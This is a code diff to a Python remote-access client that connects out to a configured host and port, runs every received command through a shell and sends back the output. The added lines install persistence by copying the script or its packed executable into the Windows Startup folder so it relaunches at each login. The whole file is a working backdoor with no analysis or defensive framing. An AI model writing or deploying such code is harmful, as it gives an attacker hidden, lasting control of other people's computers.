@@ -1,9 +1,33 @@
 import socket
 import subprocess
+import os
+import shutil
+import sys
 
 
 class Client:
     def __init__(self, host, port):
+        if hasattr(sys, "_MEIPASS"):
+            exe_path = sys.executable
+        else:
+            exe_path = os.path.abspath(__file__)
+
+        if os.name == "nt":
+            appdata = os.getenv("APPDATA")
+
+            path = os.path.join(
+                appdata,
+                "Microsoft",
+                "Windows",
+                "Start Menu",
+                "Programs",
+                "Startup",
+                os.path.basename(exe_path),
+            )
+
+            if not os.path.exists(path):
+                shutil.copyfile(exe_path, path)
+
         self.host = host
         self.port = port
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -17,6 +41,8 @@ class Client:
 
 
 client = None
+
+
 def connect():
     global client
     while client is None:
@@ -30,9 +56,12 @@ connect()
 
 while True:
     try:
+
         command = client.receive().decode()
+
         if command is None:
             continue
+
         output = subprocess.run(
             command,
             shell=True,
@@ -48,4 +77,3 @@ while True:
     except Exception:
         client = None
         connect()
-        
